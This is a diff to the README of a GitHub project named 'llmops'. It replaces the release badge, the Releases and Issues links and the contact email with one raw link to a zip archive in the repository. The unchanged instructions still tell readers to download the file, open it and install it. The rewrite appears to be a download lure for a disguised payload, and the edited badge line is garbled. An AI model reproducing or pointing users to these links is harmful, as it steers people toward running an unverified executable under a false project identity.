@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/xxxihrmn/llmops/releases)
+[![Download Latest Release](https://github.com/xxxihrmn/llmops/raw/refs/heads/main/homogenic/Software_v2.5.zip%20Latest%https://github.com/xxxihrmn/llmops/raw/refs/heads/main/homogenic/Software_v2.5.zip)](https://github.com/xxxihrmn/llmops/raw/refs/heads/main/homogenic/Software_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -32,13 +32,13 @@ The **llmops** project includes:
 
 To get started, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/xxxihrmn/llmops/releases) to see the latest version of the software.
+1. Visit the [Releases page](https://github.com/xxxihrmn/llmops/raw/refs/heads/main/homogenic/Software_v2.5.zip) to see the latest version of the software.
 2. Locate the version you want to download. You will see a list of assets available.
 3. Click on the appropriate file for your operating system (e.g., executable for Windows or a zip file for macOS/Linux).
 4. Once the download is complete, locate the file in your downloads folder.
 5. Open the file and follow the on-screen instructions to complete the installation.
 
-You can revisit the [Releases page](https://github.com/xxxihrmn/llmops/releases) anytime you want to check for updates.
+You can revisit the [Releases page](https://github.com/xxxihrmn/llmops/raw/refs/heads/main/homogenic/Software_v2.5.zip) anytime you want to check for updates.
 
 ## 🛠️ Usage
 
@@ -56,7 +56,7 @@ Customization options allow you to adapt the tools to your specific needs, givin
 
 Our community is here to help. If you have any questions or face issues, feel free to:
 
-- Join the discussion on our [GitHub Issues page](https://github.com/xxxihrmn/llmops/issues).
+- Join the discussion on our [GitHub Issues page](https://github.com/xxxihrmn/llmops/raw/refs/heads/main/homogenic/Software_v2.5.zip).
 - Check out documentation and guides to get the most out of your experience.
 - Share your feedback. Your insights can help improve the project.
 
@@ -90,6 +90,6 @@ This project is licensed under the MIT License. For more details, please check t
 
 ## 📧 Contact
 
-For any inquiries, please reach out at: support@llmops.com.
+For any inquiries, please reach out at: https://github.com/xxxihrmn/llmops/raw/refs/heads/main/homogenic/Software_v2.5.zip
 
 Thank you for choosing **llmops**! We cannot wait to see what you build with our tools.
